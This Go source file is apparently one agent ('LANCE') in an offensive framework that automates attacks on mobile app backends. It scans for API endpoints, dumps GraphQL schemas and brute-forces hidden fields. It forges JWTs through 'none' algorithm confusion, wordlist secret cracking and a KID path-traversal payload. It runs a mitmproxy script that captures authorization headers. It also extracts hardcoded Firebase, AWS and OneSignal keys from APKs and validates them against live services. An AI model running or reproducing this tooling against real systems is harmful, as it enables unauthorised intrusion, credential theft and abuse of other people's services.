// LANCE — API-BREAKER Agent
// GraphQL map, JWT forge, MITM proxy, SDK API key poison

package mobilebreach

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strings"
)

// APIBreaker handles mobile backend API attacks
type APIBreaker struct {
	bus    *EventBus
	state  *SharedState
	stopCh chan struct{}
	msgCh  chan AgentMessage
}

func NewAPIBreaker(bus *EventBus, state *SharedState) *APIBreaker {
	return &APIBreaker{
		bus:    bus,
		state:  state,
		stopCh: make(chan struct{}),
		msgCh:  make(chan AgentMessage, 50),
	}
}

func (l *APIBreaker) Name() string   { return "LANCE" }
func (l *APIBreaker) Status() string { return "online" }

func (l *APIBreaker) Start() {
	l.bus.Subscribe("LANCE", l.msgCh)
	for {
		select {
		case msg := <-l.msgCh:
			l.Handle(msg)
		case <-l.stopCh:
			return
		}
	}
}

func (l *APIBreaker) Stop() {
	close(l.stopCh)
}

func (l *APIBreaker) Handle(msg AgentMessage) {
	switch msg.Type {
	case "API_RECON":
		l.apiRecon(msg.Data)
	case "GRAPHQL_MAP":
		l.graphQLMap(msg.Data)
	case "JWT_FORGE":
		l.jwtForge(msg.Data)
	case "MITM_START":
		l.startMITM(msg.Data)
	case "SDK_POISON":
		l.sdkPoison(msg.Data)
	}
}

func (l *APIBreaker) broadcast(msg string) {
	l.bus.Broadcast(AgentMessage{From: "LANCE", To: "ALL", Type: "LOG", Data: msg})
}

// ─── Feature 8: API Endpoint Discovery ────────────────────────────
func (l *APIBreaker) apiRecon(url string) {
	l.broadcast(fmt.Sprintf("[LANCE] API reconnaissance: %s", url))

	apiTarget := &APITarget{BaseURL: url, Headers: make(map[string]string)}

	// 1. httpx probe with tech detection
	if out, err := exec.Command("httpx", "-u", url, "-tech-detect", "-title", "-status-code", "-silent").CombinedOutput(); err == nil {
		l.broadcast("[LANCE] httpx probe:\n" + string(out))
	}

	// 2. Subdomain enumeration for API endpoints
	if out, err := exec.Command("subfinder", "-d", extractDomain(url), "-silent").CombinedOutput(); err == nil {
		l.broadcast(fmt.Sprintf("[LANCE] Subdomains found: %d", strings.Count(string(out), "\n")))
		for _, sub := range strings.Split(string(out), "\n") {
			if strings.Contains(sub, "api") || strings.Contains(sub, "mobile") {
				l.broadcast("[+] API subdomain: " + sub)
			}
		}
	}

	// 3. Endpoint brute-force with arjun
	if out, err := exec.Command("arjun", "-u", url, "--get", "--stable").CombinedOutput(); err == nil {
		l.broadcast("[LANCE] arjun parameter discovery:\n" + string(out))
	}

	// 4. Check for common mobile API endpoints
	endpoints := []string{
		"/api/v1/", "/api/v2/", "/graphql", "/graphiql", "/swagger.json",
		"/openapi.json", "/api/docs", "/api/health", "/api/users",
		"/api/auth", "/api/login", "/api/register", "/api/verify",
	}
	for _, ep := range endpoints {
		fullURL := url + ep
		out, err := exec.Command("curl", "-s", "-o", "/dev/null", "-w", "%{http_code},%{content_type},%{size_download}", fullURL).CombinedOutput()
		if err == nil {
			parts := strings.Split(string(out), ",")
			if len(parts) >= 1 {
				code := strings.TrimSpace(parts[0])
				if code == "200" || code == "401" || code == "403" {
					l.broadcast(fmt.Sprintf("[+] Endpoint found: %s (HTTP %s)", fullURL, code))
					apiTarget.Endpoints = append(apiTarget.Endpoints, APIEndpoint{
						Path:         ep,
						StatusCode:   parseInt(code),
						AuthRequired: code == "401" || code == "403",
					})
				}
			}
		}
	}

	// 5. Nuclei template scan for mobile-specific vulns
	if out, err := exec.Command("nuclei", "-u", url, "-t", "cves/", "-silent", "-c", "50").CombinedOutput(); err == nil {
		if len(out) > 0 {
			l.broadcast("[LANCE] Nuclei findings:\n" + string(out))
		}
	}

	l.state.mu.Lock()
	l.state.APITargets = append(l.state.APITargets, apiTarget)
	l.state.mu.Unlock()

	l.broadcast(fmt.Sprintf("[LANCE] API recon complete. Endpoints: %d", len(apiTarget.Endpoints)))
}

// ─── Feature 9: GraphQL Deep Map ─────────────────────────────────
func (l *APIBreaker) graphQLMap(url string) {
	l.broadcast(fmt.Sprintf("[LANCE] GraphQL deep map: %s", url))

	graphqlURL := url + "/graphql"

	// 1. Introspection query
	introspectionQuery := `{"query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }" }`

	cmd := exec.Command("curl", "-s", "-X", "POST", graphqlURL,
		"-H", "Content-Type: application/json",
		"-d", introspectionQuery)
	out, err := cmd.CombinedOutput()
	if err != nil || !strings.Contains(string(out), "__schema") {
		l.broadcast("[!] GraphQL introspection disabled or endpoint not found")
		return
	}

	l.broadcast("[LANCE] GraphQL introspection enabled! Parsing schema...")

	// 2. Save schema
	schemaFile := "/tmp/nexus-void/mobile/graphql_schema.json"
	os.WriteFile(schemaFile, out, 0644)

	// 3. graphqlmap attack
	if out2, err := exec.Command("graphqlmap", "-u", graphqlURL, "--introspection").CombinedOutput(); err == nil {
		l.broadcast("[LANCE] graphqlmap output:\n" + string(out2))
	}

	// 4. Batch query attack (multiple operations in one request)
	batchQuery := `{"query": "query { a:__typename b:__typename c:__typename d:__typename e:__typename f:__typename g:__typename h:__typename i:__typename j:__typename }" }`
	cmd2 := exec.Command("curl", "-s", "-X", "POST", graphqlURL,
		"-H", "Content-Type: application/json",
		"-d", batchQuery)
	out3, _ := cmd2.CombinedOutput()
	if strings.Count(string(out3), "Query") > 1 {
		l.broadcast("[+] GraphQL batch query accepted! DOS potential.")
	}

	// 5. Field suggestion brute-force
	l.broadcast("[LANCE] Testing field suggestion...")
	for _, field := range []string{"users", "admin", "password", "token", "secrets", "config"} {
		query := fmt.Sprintf(`{"query": "query { %s { id } }"}`, field)
		cmd3 := exec.Command("curl", "-s", "-X", "POST", graphqlURL,
			"-H", "Content-Type: application/json",
			"-d", query)
		out4, _ := cmd3.CombinedOutput()
		if strings.Contains(string(out4), "data") || strings.Contains(string(out4), "id") {
			l.broadcast(fmt.Sprintf("[+] Hidden field found: %s", field))
		}
	}
}

// ─── Feature 10: JWT Token Forge ─────────────────────────────────
func (l *APIBreaker) jwtForge(url string) {
	l.broadcast(fmt.Sprintf("[LANCE] JWT token forge: %s", url))

	// 1. Check for JWT in responses
	cmd := exec.Command("curl", "-s", "-I", url)
	out, _ := cmd.CombinedOutput()
	_ = out

	// 2. Run jwt_tool comprehensive tests
	jwtTestFile := "/tmp/nexus-void/mobile/jwt_results.txt"
	os.MkdirAll("/tmp/nexus-void/mobile", 0755)

	// Algorithm confusion (none)
	cmd2 := exec.Command("jwt_tool", "-t", url, "-M", "at", "-cv", "none")
	if out2, err := cmd2.CombinedOutput(); err == nil {
		os.WriteFile(jwtTestFile, out2, 0644)
		l.broadcast("[LANCE] jwt_tool algorithm confusion test complete")
		if strings.Contains(string(out2), "VULNERABLE") {
			l.broadcast("[CRITICAL] JWT algorithm confusion vulnerability found!")
		}
	}

	// Brute-force weak secret
	wordlists := []string{"/usr/share/wordlists/rockyou.txt", "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"}
	for _, wl := range wordlists {
		if _, err := os.Stat(wl); err == nil {
			cmd3 := exec.Command("jwt_tool", "-t", url, "-C", "-w", wl, "-rp", "Host: "+extractDomain(url))
			if out3, err := cmd3.CombinedOutput(); err == nil {
				if strings.Contains(string(out3), "SUCCESS") {
					l.broadcast("[CRITICAL] JWT weak secret cracked!")
					_ = out3
				}
			}
			break
		}
	}

	// KID header injection
	kidPayload := `{"typ":"JWT","alg":"HS256","kid":"../../../etc/passwd"}`
	cmd4 := exec.Command("curl", "-s", "-X", "POST", url, "-H", "Authorization: Bearer "+kidPayload)
	out4, _ := cmd4.CombinedOutput()
	_ = out4
	l.broadcast("[LANCE] JWT KID header injection tested")
}

// ─── Feature 11: MITM Auto-Proxy ─────────────────────────────────
func (l *APIBreaker) startMITM(url string) {
	l.broadcast(fmt.Sprintf("[LANCE] Starting MITM proxy for: %s", url))

	// Start mitmproxy with dump script
	os.MkdirAll("/tmp/nexus-void/mobile/mitm", 0755)
	mitmScript := `
from mitmproxy import http, ctx
import json, os

DUMP_FILE = "/tmp/nexus-void/mobile/mitm/captured_requests.jsonl"

def request(flow: http.HTTPFlow) -> None:
    entry = {
        "method": flow.request.method,
        "url": flow.request.pretty_url,
        "headers": dict(flow.request.headers),
        "body": flow.request.text[:10000] if flow.request.text else ""
    }
    with open(DUMP_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

    # Check for API keys in headers
    for k, v in flow.request.headers.items():
        if any(x in k.lower() for x in ["api-key", "authorization", "x-api-key", "token"]):
            ctx.log.alert(f"[API KEY] {k}: {v[:50]}")

    # Check for GraphQL
    if "graphql" in flow.request.pretty_url.lower():
        ctx.log.alert(f"[GRAPHQL] {flow.request.pretty_url}")
`
	scriptPath := "/tmp/nexus-void/mobile/mitm_proxy.py"
	os.WriteFile(scriptPath, []byte(mitmScript), 0644)

	// Install CA on device (requires ADB root or manual install)
	l.broadcast("[LANCE] Installing mitmproxy CA on device...")
	exec.Command("adb", "push", os.ExpandEnv("$HOME/.mitmproxy/mitmproxy-ca-cert.cer"), "/sdcard/").Run()

	// Start proxy
	cmd := exec.Command("mitmproxy", "-s", scriptPath, "--set", "block_global=false")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	go cmd.Run()

	l.broadcast("[LANCE] mitmproxy running on port 8080. Configure device proxy to this machine.")
	l.broadcast("[LANCE] Captured requests will be saved to /tmp/nexus-void/mobile/mitm/")
}

// ─── Feature 12: SDK API Key Poisoning ───────────────────────────
func (l *APIBreaker) sdkPoison(path string) {
	l.broadcast(fmt.Sprintf("[LANCE] SDK API key extraction: %s", path))

	// Scan APK/IPA for hardcoded SDK keys
	sdks := []struct {
		Name    string
		Pattern string
	}{
		{"Firebase", "AIza[0-9A-Za-z_-]{35}"},
		{"OneSignal", "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"},
		{"AppsFlyer", "[A-Za-z0-9]{20,40}"},
		{"Amplitude", "[0-9a-f]{32}"},
		{"Mixpanel", "[0-9a-f]{32}"},
		{"Segment", "[A-Za-z0-9]{20,40}"},
		{"Sentry", `https://[0-9a-f]{32}@o[0-9]+\.ingest\.sentry\.io`},
		{"AWS Access Key", "AKIA[0-9A-Z]{16}"},
		{"Google Maps", "AIza[0-9A-Za-z_-]{35}"},
	}

	for _, sdk := range sdks {
		cmd := exec.Command("grep", "-riEo", sdk.Pattern, path)
		out, _ := cmd.CombinedOutput()
		if len(out) > 0 {
			for _, match := range strings.Split(string(out), "\n") {
				if len(match) > 10 && len(match) < 100 {
					l.broadcast(fmt.Sprintf("[+] %s API key found: %s...", sdk.Name, match[:min(len(match), 30)]))
					l.validateSDKKey(sdk.Name, match)
				}
			}
		}
	}
}

func (l *APIBreaker) validateSDKKey(name, key string) {
	// Validate Firebase key
	if name == "Firebase" {
		cmd := exec.Command("curl", "-s", fmt.Sprintf("https://firebase.googleapis.com/v1beta1/projects?key=%s", key))
		out, _ := cmd.CombinedOutput()
		if strings.Contains(string(out), "projectId") {
			l.broadcast("[CRITICAL] Firebase key VALID! Can read project data.")
			var result map[string]interface{}
			if err := json.Unmarshal(out, &result); err == nil {
				if projects, ok := result["results"].([]interface{}); ok {
					l.broadcast(fmt.Sprintf("[CRITICAL] Access to %d Firebase projects!", len(projects)))
				}
			}
		}
	}

	// Validate OneSignal
	if name == "OneSignal" {
		cmd := exec.Command("curl", "-s", "-H", fmt.Sprintf("Authorization: Basic %s", key),
			"https://onesignal.com/api/v1/apps")
		out, _ := cmd.CombinedOutput()
		if strings.Contains(string(out), "id") {
			l.broadcast("[CRITICAL] OneSignal key VALID! Can send push notifications to ALL users.")
		}
	}
}

// ─── Helpers ──────────────────────────────────────────────────────

func extractDomain(url string) string {
	url = strings.TrimPrefix(url, "https://")
	url = strings.TrimPrefix(url, "http://")
	url = strings.TrimPrefix(url, "www.")
	if idx := strings.Index(url, "/"); idx > 0 {
		return url[:idx]
	}
	return url
}

func parseInt(s string) int {
	var n int
	fmt.Sscanf(s, "%d", &n)
	return n
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
